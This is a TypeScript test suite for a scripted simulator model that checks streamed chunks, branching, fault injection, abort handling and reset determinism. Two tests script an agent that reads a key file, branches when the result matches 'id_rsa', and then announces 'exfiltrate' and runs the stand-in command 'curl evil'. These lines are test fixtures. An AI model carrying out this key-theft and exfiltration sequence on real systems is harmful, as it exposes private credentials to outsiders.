import { describe, expect, it } from "vitest";
import type { SimulatorScriptT } from "@keel/shared";
import { ModelStreamChunk } from "@keel/shared";
import { ControlFlowError } from "./errors.js";
import { ScriptedModel } from "./script-model.js";
import { drain } from "./testing/drain.js";

// ---------------------------------------------------------------------------
// Helpers for terminal-chunk invariant assertions (finding T)
// ---------------------------------------------------------------------------

/** True when a chunk is the terminal variant (finish or error). */
function isTerminal(chunk: { type: string }): boolean {
  return chunk.type === "finish" || chunk.type === "error";
}

/**
 * Drain the model and assert the terminal-chunk invariant holds:
 * - every chunk parses as ModelStreamChunk
 * - exactly one chunk is terminal
 * - the terminal chunk is the last element
 */
async function assertTerminalInvariant(
  model: ScriptedModel,
  messages: Parameters<typeof drain>[1],
): Promise<void> {
  const chunks = await drain(model, messages);
  for (const c of chunks) {
    expect(ModelStreamChunk.parse(c)).toEqual(c);
  }
  const terminalIndices = chunks.map((c, i) => (isTerminal(c) ? i : -1)).filter((i) => i !== -1);
  expect(terminalIndices).toHaveLength(1);
  expect(terminalIndices[0]).toBe(chunks.length - 1);
}

describe("ScriptedModel", () => {
  it("emits text, deterministic tool-call ids, then a tool-calls finish", async () => {
    // "listing" = 7 chars -> ceil(7/4)=2 text tokens; +1 tool call -> outputTokens 3
    const script: SimulatorScriptT = {
      turns: [{ text: "listing", toolCalls: [{ name: "bash", args: { command: "ls" } }] }],
    };
    const model = new ScriptedModel(script);
    expect(await drain(model, [{ role: "user", content: "go" }])).toEqual([
      { type: "text-delta", text: "listing" },
      { type: "tool-call", id: "call_0_0", name: "bash", args: { command: "ls" } },
      { type: "finish", reason: "tool-calls", usage: { inputTokens: 0, outputTokens: 3 } },
    ]);
  });

  it("emits a plain stop finish for a text-only turn (no tools)", async () => {
    const model = new ScriptedModel({ turns: [{ text: "hi" }] }); // ceil(2/4)=1
    expect(await drain(model, [])).toEqual([
      { type: "text-delta", text: "hi" },
      { type: "finish", reason: "stop", usage: { inputTokens: 0, outputTokens: 1 } },
    ]);
  });

  it("ignores ModelTurnInput.params (the Phase-1 adapter seam) and emits normally", async () => {
    // params (reasoning sandwich / temp / model) are a seam for the real provider adapter;
    // the scripted model reads none of them — verify it does not choke at runtime.
    const model = new ScriptedModel({ turns: [{ text: "hi" }] });
    const chunks: Awaited<ReturnType<typeof drain>> = [];
    for await (const c of model.stream({
      messages: [{ role: "user", content: "go" }],
      params: { reasoningEffort: "high", temperature: 0.5, model: "x", maxOutputTokens: 100 },
    })) {
      chunks.push(c);
    }
    expect(chunks).toEqual([
      { type: "text-delta", text: "hi" },
      { type: "finish", reason: "stop", usage: { inputTokens: 0, outputTokens: 1 } },
    ]);
  });

  it("jumps to the branch target when the latest tool result matches", async () => {
    const script: SimulatorScriptT = {
      turns: [
        { toolCalls: [{ name: "bash", args: { command: "cat key" } }] }, // 0
        { branches: [{ match: { on: "toolResult", kind: "regex", pattern: "id_rsa" }, goto: 2 }] }, // 1
        { text: "exfiltrate", toolCalls: [{ name: "bash", args: { command: "curl evil" } }] }, // 2
      ],
    };
    const model = new ScriptedModel(script);
    await drain(model, [{ role: "user", content: "go" }]); // turn 0
    const chunks = await drain(model, [
      { role: "tool", content: "-----BEGIN id_rsa-----", toolCallId: "call_0_0", name: "bash" },
    ]); // turn 1 -> branch -> turn 2
    expect(chunks[0]).toEqual({ type: "text-delta", text: "exfiltrate" });
    // the tool-call id must reflect the emission count (1 prior emission), not the turn index (2)
    expect(chunks[1]).toEqual({
      type: "tool-call",
      id: "call_1_0",
      name: "bash",
      args: { command: "curl evil" },
    });
  });

  it("falls through a non-matching pure-control turn to the next turn", async () => {
    const script: SimulatorScriptT = {
      turns: [
        { branches: [{ match: { on: "toolResult", kind: "regex", pattern: "nope" }, goto: 9 }] }, // 0 (no match, no content)
        { text: "default continuation" }, // 1
      ],
    };
    const chunks = await drain(new ScriptedModel(script), [
      { role: "tool", content: "unrelated", toolCallId: "t", name: "bash" },
    ]);
    expect(chunks[0]).toEqual({ type: "text-delta", text: "default continuation" });
  });

  it("emits a stop finish when the script is exhausted", async () => {
    const model = new ScriptedModel({ turns: [] });
    expect(await drain(model, [])).toEqual([
      { type: "finish", reason: "stop", usage: { inputTokens: 0, outputTokens: 0 } },
    ]);
  });

  it("replays identically across runs via reset()", async () => {
    const script: SimulatorScriptT = { turns: [{ text: "a" }, { text: "b" }] };
    const model = new ScriptedModel(script);
    const run1 = [...(await drain(model, [])), ...(await drain(model, []))];
    model.reset();
    const run2 = [...(await drain(model, [])), ...(await drain(model, []))];
    expect(run2).toEqual(run1);
  });

  it("throws ControlFlowError on a cyclic goto", async () => {
    const script: SimulatorScriptT = {
      turns: [
        { branches: [{ match: { on: "toolResult", kind: "regex", pattern: ".*" }, goto: 0 }] },
      ],
    };
    await expect(
      drain(new ScriptedModel(script), [
        { role: "tool", content: "x", toolCallId: "t", name: "bash" },
      ]),
    ).rejects.toThrow(ControlFlowError);
  });
});

describe("ScriptedModel streaming + fault injection", () => {
  it("splits text into chunks of the configured size", async () => {
    const model = new ScriptedModel({
      turns: [{ text: "abcdef" }], // ceil(6/4)=2 output tokens
      faultInjection: { chunkSize: 2 },
    });
    expect(await drain(model, [])).toEqual([
      { type: "text-delta", text: "ab" },
      { type: "text-delta", text: "cd" },
      { type: "text-delta", text: "ef" },
      { type: "finish", reason: "stop", usage: { inputTokens: 0, outputTokens: 2 } },
    ]);
  });

  it("injects a parseable error chunk (not a crash) at the configured index and terminates", async () => {
    const model = new ScriptedModel({
      turns: [{ text: "abcd" }],
      faultInjection: { chunkSize: 2, malformedChunkAtIndex: 1 },
    });
    const chunks = await drain(model, []);
    expect(chunks).toEqual([
      { type: "text-delta", text: "ab" },
      { type: "error", code: "malformed-chunk", message: "injected malformed chunk at index 1" },
    ]);
    // every emitted chunk is itself a valid ModelStreamChunk -> parseable, no crash
    for (const c of chunks) expect(ModelStreamChunk.parse(c)).toEqual(c);
  });

  it("injects the error as the very first chunk (index 0), before any text or tool call", async () => {
    const model = new ScriptedModel({
      turns: [{ text: "abcd", toolCalls: [{ name: "x", args: {} }] }],
      faultInjection: { chunkSize: 2, malformedChunkAtIndex: 0 },
    });
    // the error is the sole, terminal chunk — no text-delta and no tool-call precede or follow it
    expect(await drain(model, [])).toEqual([
      { type: "error", code: "malformed-chunk", message: "injected malformed chunk at index 0" },
    ]);
  });
});

describe("ScriptedModel id uniqueness, abort, and args isolation", () => {
  it("emits distinct tool-call ids across branch revisits (no id collision)", async () => {
    // turn 0: content turn with a tool call
    // turn 1: branch back to turn 0 when tool result matches "revisit"
    // Driving stream() repeatedly always re-visits turn 0, so each emission
    // must get a fresh, unique id derived from a monotonic counter.
    const script: SimulatorScriptT = {
      turns: [
        { toolCalls: [{ name: "bash", args: { command: "ls" } }] }, // 0: content turn
        { branches: [{ match: { on: "toolResult", kind: "regex", pattern: "revisit" }, goto: 0 }] }, // 1: branch back to 0
      ],
    };
    const model = new ScriptedModel(script);
    const ids: string[] = [];

    // First call: emits turn 0
    const chunks0 = await drain(model, [{ role: "user", content: "go" }]);
    for (const c of chunks0) if (c.type === "tool-call") ids.push(c.id);

    // Second call: turn 1 branches back to turn 0, which re-emits a tool call
    const chunks1 = await drain(model, [
      { role: "tool", content: "revisit", toolCallId: ids[0]!, name: "bash" },
    ]);
    for (const c of chunks1) if (c.type === "tool-call") ids.push(c.id);

    // Third call: again revisited
    const chunks2 = await drain(model, [
      { role: "tool", content: "revisit", toolCallId: ids[1]!, name: "bash" },
    ]);
    for (const c of chunks2) if (c.type === "tool-call") ids.push(c.id);

    // All emitted ids across all three stream() calls must be distinct
    expect(ids.length).toBeGreaterThanOrEqual(3);
    expect(new Set(ids).size).toBe(ids.length);
  });

  it("yields only an aborted finish when given an already-aborted AbortSignal", async () => {
    const script: SimulatorScriptT = {
      turns: [
        { text: "should not appear", toolCalls: [{ name: "bash", args: { command: "ls" } }] },
      ],
    };
    const model = new ScriptedModel(script);
    const controller = new AbortController();
    controller.abort();

    const chunks: Awaited<ReturnType<typeof drain>> = [];
    for await (const chunk of model.stream({ messages: [], signal: controller.signal })) {
      chunks.push(chunk);
    }

    expect(chunks).toEqual([
      { type: "finish", reason: "aborted", usage: { inputTokens: 0, outputTokens: 0 } },
    ]);
  });

  it("aborts mid-turn when the AbortSignal fires between chunk yields", async () => {
    // Multi-chunk turn (chunkSize splits text): abort the signal after the first chunk
    // to exercise the mid-loop abort path.
    const script: SimulatorScriptT = {
      turns: [{ text: "abcdef", toolCalls: [{ name: "bash", args: { command: "ls" } }] }],
      faultInjection: { chunkSize: 2 },
    };
    const model = new ScriptedModel(script);
    const controller = new AbortController();
    const chunks: Awaited<ReturnType<typeof drain>> = [];
    for await (const chunk of model.stream({ messages: [], signal: controller.signal })) {
      chunks.push(chunk);
      if (chunk.type === "text-delta" && chunk.text === "ab") {
        // Abort after the first text-delta; subsequent chunks should not appear
        controller.abort();
      }
    }
    // Should have: the first text-delta, then the aborted finish (no further text or tool-call)
    expect(chunks).toEqual([
      { type: "text-delta", text: "ab" },
      { type: "finish", reason: "aborted", usage: { inputTokens: 0, outputTokens: 0 } },
    ]);
  });

  it("clones tool-call args so downstream mutation does not affect re-emitted args", async () => {
    const script: SimulatorScriptT = {
      turns: [{ toolCalls: [{ name: "bash", args: { command: "ls" } }] }],
    };

    // First instance: capture emitted args and mutate them
    const model1 = new ScriptedModel(script);
    const chunks1 = await drain(model1, [{ role: "user", content: "go" }]);
    const toolCallChunk = chunks1.find((c) => c.type === "tool-call");
    expect(toolCallChunk?.type).toBe("tool-call");
    if (toolCallChunk?.type === "tool-call") {
      // Mutate the emitted args object
      toolCallChunk.args["command"] = "HACKED";
    }

    // Second instance: same script, fresh model — emitted args must still be the original
    const model2 = new ScriptedModel(script);
    const chunks2 = await drain(model2, [{ role: "user", content: "go" }]);
    const toolCallChunk2 = chunks2.find((c) => c.type === "tool-call");
    expect(toolCallChunk2?.type).toBe("tool-call");
    if (toolCallChunk2?.type === "tool-call") {
      expect(toolCallChunk2.args).toEqual({ command: "ls" });
    }
  });

  it("does not reuse a tool-call id after an abort interrupts the finish chunk", async () => {
    // Regression: the emission-index counter must advance when the turn is COMMITTED, not at
    // the end of emitTurn — otherwise an abort that abandons emitTurn before its trailing logic
    // would leave the counter stale and the next stream() call would emit a colliding id.
    const script: SimulatorScriptT = {
      turns: [
        { toolCalls: [{ name: "bash", args: { command: "a" } }] }, // 0
        { toolCalls: [{ name: "bash", args: { command: "b" } }] }, // 1
      ],
    };
    const model = new ScriptedModel(script);
    const controller = new AbortController();
    const ids: string[] = [];
    // Turn 0: take the tool-call, then abort so the pending finish becomes an aborted finish.
    for await (const chunk of model.stream({ messages: [], signal: controller.signal })) {
      if (chunk.type === "tool-call") {
        ids.push(chunk.id);
        controller.abort();
      }
    }
    // Turn 1: a fresh (un-aborted) stream() call must NOT reuse turn 0's id index.
    for await (const chunk of model.stream({ messages: [] })) {
      if (chunk.type === "tool-call") ids.push(chunk.id);
    }
    expect(ids).toEqual(["call_0_0", "call_1_0"]);
    expect(new Set(ids).size).toBe(ids.length);
  });
});

// ---------------------------------------------------------------------------
// Finding T — terminal-chunk invariant: exactly one terminal chunk, and last
// ---------------------------------------------------------------------------

describe("ScriptedModel terminal-chunk invariant", () => {
  it("text-only turn: single terminal finish chunk, last", async () => {
    await assertTerminalInvariant(new ScriptedModel({ turns: [{ text: "hello world" }] }), []);
  });

  it("tool-only turn: single terminal finish chunk, last", async () => {
    await assertTerminalInvariant(
      new ScriptedModel({ turns: [{ toolCalls: [{ name: "bash", args: { command: "ls" } }] }] }),
      [{ role: "user", content: "go" }],
    );
  });

  it("mixed text+tool turn: single terminal finish chunk, last", async () => {
    await assertTerminalInvariant(
      new ScriptedModel({
        turns: [{ text: "running", toolCalls: [{ name: "bash", args: { command: "date" } }] }],
      }),
      [{ role: "user", content: "go" }],
    );
  });

  it("chunked turn via faultInjection: single terminal finish chunk, last", async () => {
    // chunkSize splits text into multiple text-delta chunks; finish is still exactly one, last
    await assertTerminalInvariant(
      new ScriptedModel({ turns: [{ text: "abcdefgh" }], faultInjection: { chunkSize: 2 } }),
      [],
    );
  });

  it("fault-injected error chunk: single terminal error chunk, last", async () => {
    // malformedChunkAtIndex injects an error chunk and terminates — no further chunks
    await assertTerminalInvariant(
      new ScriptedModel({
        turns: [{ text: "abcdef" }],
        faultInjection: { chunkSize: 2, malformedChunkAtIndex: 1 },
      }),
      [],
    );
  });

  it("branched script: single terminal finish chunk per stream() call", async () => {
    const script: SimulatorScriptT = {
      turns: [
        { toolCalls: [{ name: "bash", args: { command: "cat key" } }] }, // 0
        { branches: [{ match: { on: "toolResult", kind: "regex", pattern: "id_rsa" }, goto: 2 }] }, // 1
        { text: "exfiltrate", toolCalls: [{ name: "bash", args: { command: "curl evil" } }] }, // 2
      ],
    };
    const model = new ScriptedModel(script);
    // Turn 0
    await assertTerminalInvariant(model, [{ role: "user", content: "go" }]);
    // Turn 1 (branch) → turn 2
    await assertTerminalInvariant(model, [
      { role: "tool", content: "-----BEGIN id_rsa-----", toolCallId: "call_0_0", name: "bash" },
    ]);
  });

  it("exhausted script (no turns): single terminal finish chunk, last", async () => {
    await assertTerminalInvariant(new ScriptedModel({ turns: [] }), []);
  });
});

// ---------------------------------------------------------------------------
// Finding S — reset() determinism under a branched script
// ---------------------------------------------------------------------------

describe("ScriptedModel reset() determinism — branched script", () => {
  it("produces byte-identical transcripts from fresh instance vs reset() on the same script", async () => {
    // A script with a result-keyed branch: turn 0 emits a tool call; turn 1 branches to turn 2
    // when the tool result matches "match-me"; turn 2 emits text. Drive it with the same two
    // messages twice to exercise the branch path.
    const script: SimulatorScriptT = {
      turns: [
        { toolCalls: [{ name: "bash", args: { command: "ls" } }] }, // 0: emits tool call
        {
          branches: [{ match: { on: "toolResult", kind: "regex", pattern: "match-me" }, goto: 2 }],
        }, // 1: branch control turn
        { text: "branch taken", toolCalls: [{ name: "bash", args: { command: "echo done" } }] }, // 2: content after branch
      ],
    };

    const toolResultMessages = [
      { role: "tool" as const, content: "match-me", toolCallId: "call_0_0", name: "bash" },
    ];

    // --- Fresh instance (reference) ---
    const fresh = new ScriptedModel(script);
    // Stream 1: turn 0 → tool call emitted
    const fresh1 = await drain(fresh, [{ role: "user", content: "go" }]);
    // Stream 2: turn 1 (branch matches) → turn 2 (text + tool call)
    const fresh2 = await drain(fresh, toolResultMessages);

    // --- Same instance, reset() ---
    const reused = new ScriptedModel(script);
    const reused1a = await drain(reused, [{ role: "user", content: "go" }]);
    const reused2a = await drain(reused, toolResultMessages);
    // Now reset and replay
    reused.reset();
    const reused1b = await drain(reused, [{ role: "user", content: "go" }]);
    const reused2b = await drain(reused, toolResultMessages);

    // Fresh-instance and post-reset transcripts must be identical
    expect(reused1b).toEqual(fresh1);
    expect(reused2b).toEqual(fresh2);

    // Pre-reset and post-reset transcripts must also be identical
    expect(reused1b).toEqual(reused1a);
    expect(reused2b).toEqual(reused2a);
  });
});
